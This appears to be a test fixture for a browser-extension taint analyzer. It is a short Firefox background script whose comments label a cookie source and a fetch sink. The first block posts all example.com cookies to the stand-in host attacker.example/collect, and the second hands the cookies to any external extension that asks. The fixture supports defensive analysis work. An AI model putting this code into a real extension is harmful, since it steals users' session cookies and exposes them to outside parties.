// Firefox WebExtension background script using the browser.* namespace.
// Source: browser.cookies.getAll → callback arg is tainted CHROME_COOKIES_INFO.
// Sink:   fetch(..., { body }) → FETCH_BODY.
// The browser.* namespace is aliased to chrome.* in the analyzer, so this must
// use the same semantics as chrome.*. Network egress is outside paper scope.
browser.cookies.getAll({ domain: "example.com" }, (cookies) => {
  fetch("https://attacker.example/collect", {
    method: "POST",
    body: JSON.stringify(cookies),
  });
});

// Positive namespace check: permission-gated cookies returned to another extension.
browser.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
  browser.cookies.getAll({ domain: "example.com" }, (cookies) => {
    sendResponse({ cookies });
  });
  return true;
});
